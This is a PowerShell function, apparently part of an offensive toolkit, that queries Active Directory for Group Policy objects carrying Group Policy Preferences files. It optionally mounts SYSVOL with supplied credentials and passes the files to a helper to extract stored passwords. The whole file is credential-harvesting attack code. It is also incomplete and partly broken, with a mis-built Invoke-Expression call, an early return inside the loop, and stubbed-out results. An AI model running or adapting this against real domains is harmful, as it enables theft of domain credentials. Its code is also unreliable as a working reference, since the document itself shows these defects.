Function Get-GPPPassword2 {
    param($Domain=$null,$Username=$null,$Password=$null,$DC)



    $CSEGUIDs = @{
                '{5794DAFD-BE60-433f-88A2-1A31939AC01F}'='\User\Preferences\Drives\Drives.xml'
                '{17D89FEC-5C44-4972-B12D-241CAEF74509}'='\Machine\Preferences\Groups\Groups.xml'
                '{B087BE9D-ED37-454f-AF9C-04291E351182}'='\Machine\Preferences\Registry\Registry.xml'
                '{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}'='\Machine\Preferences\Scheduledtasks\Scheduledtasks.xml'
                '{728EE579-943C-4519-9EF7-AB56765798ED}'='\Machine\Preferences\DataSources\DataSources.xml'
                '{BC75B1ED-5833-4858-9BB8-CBF0B166DF9D}'='\User\Preferences\Printers\Printers.xml'
                '{91FBB303-0CD5-4055-BF42-E512A681B325}'='\Machine\Preferences\Services\Services.xml'
                }

    # build LDAP filter
    $LDAPFilter = '(|'
    foreach($GUID in $CSEGUIDs.Keys){ $LDAPFilter += "(gPCMachineExtensionNames=*$GUID*)" }
    $LDAPFilter += ')'

    # build LDAP uri
    if($DC)
    {
        $LDAPUri = "LDAP://$DC"
    }else{
        $LDAPUri = "LDAP://$Domain"
    }

    if($Domain -eq $null)
    {
        # local domain to be used for searching
        $ADSISearcher = [adsisearcher]$LDAPFilter
    }

    if($Domain -and $Username -eq $null -and $Password -eq $null)
    {
        # domain with no username or password, likely a domain with trust for current user
        $ADSISearcher = New-Object adsisearcher([adsi]"LDAP://$Domain",$LDAPFilter)
    }

    if($Domain -and $Username -and $Password)
    {
        # remote domain requires auth, also authenticate against SYSVOL
        $ADSISearcher = New-Object adsisearcher((New-Object adsi("LDAP://$Domain",$Username,$Password)),$LDAPFilter)
        $null = Invoke-Expression 'net use \\' + $Domain + '\SYSVOL /USER:' + $Username + ' "' + ($Password -Replace '"','\"') + '"'
    }

    # Look for GPOs that have a GPP CSE
    $GPOs = $ADSISearcher.FindAll()
    if($GPOs -eq $null)
    {
        throw 'No GPOs containing GPP that allows passwords found'
        return
    }

    foreach($GPO in $GPOs)
    {
        # first workout if any files exist and if it has any passwords to save more network calls
        $Files = $CSEGUIDs.Values | foreach{ Get-Item (Join-Path $GPO.Properties.gpcfilesyspath[0] $_) -ErrorAction SilentlyContinue }
        if(-not $Files)
        {
            Write-Verbose "$($GPO.Properties.name[0]) has no GPP files"
            return
        }

        <#
        gPLink -split '\[(.*?)\]' | Sort-Object -Unique | Where-Object { $_ -ne "" }
        2 - Enforced link enabled
        3 - Enforced link disabled
        0 - Link enabled not enforced
        1 - Link disabled and not enforced

        gPOptions - 1 - Block Inheritance 
        0 - no block

        flags attribute 
        3 - All Settings Disabled
        2 - Computer configuration settings disabled
        0 - Enabled
        1 - User configuration settings disabled
        #>


        $Files | foreach { Get-GPPData -GPPFile $_ }
        <#
        $Result = '' | Select-Object GPOPath, GPOName, GPOGUID, GPOLinkedOUs, ComputersAppliedTo
        $Result.GPPUsername = 
        $Result.GPPNewUsername
        $Result.GPPPassword
        $Result.GPOPath
        $Result.GPOName
        $Result.GPOGUID
        $Result.GPOLinkedOUs
        $Result.ComputersAppliedTo
        PotentiallyViable
        #>



    }

}